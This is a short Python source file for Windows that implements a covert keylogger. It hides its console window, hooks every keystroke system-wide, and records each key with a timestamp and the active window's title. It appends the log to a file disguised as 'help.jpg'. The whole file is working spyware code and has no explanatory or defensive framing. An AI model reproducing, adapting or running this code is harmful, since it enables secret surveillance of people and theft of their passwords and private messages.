import win32gui, win32console,pyHook,pythoncom
from datetime import datetime

winName=''
keyLst=[]
flePath = 'help.jpg'
wrtCount = 512
keyCount=0

def hideWindow():
	window=win32console.GetConsoleWindow()
	win32gui.ShowWindow(window,0)
	return True

def OnKeyboardEvent(event):
	global winName, keyLst, keyCount
	keyCount = keyCount+1
	keyEnt = {}
	keyEnt['time'] = datetime.now()
	keyEnt['window']=event.WindowName
	keyEnt['key']=event.Key

	if not winName :
		winName = event.WindowName
		
	elif winName != event.WindowName or keyCount >= wrtCount :
		writeSession(keyLst)
		keyCount = 0
		keyLst =[]
		winName = event.WindowName

	keyLst.append(keyEnt)
	return True	

def writeSession(lst):
	cnt=len(lst)

	strLog ='\n' + str(str(lst[0]['time']) + '['+lst[0]['window'] +'] : Start\n')

	for itm in lst:
		if len(itm['key']) >1:
			itm['key'] = '[' + itm['key']+']'
		strLog = strLog  + str(itm['key'],)

	strLog = strLog + '\n' + str(lst[(cnt-1)]['time'])+'['+lst[(cnt-1)]['window']+'] : End\n\n'

	with open(flePath,'a') as fle:
		fle.write(strLog)
	fle.close()

	return True


if __name__ == "__main__" :
	hook = pyHook.HookManager()
	hook.KeyDown = OnKeyboardEvent
	hook.HookKeyboard()
	hideWindow()
	pythoncom.PumpMessages()
	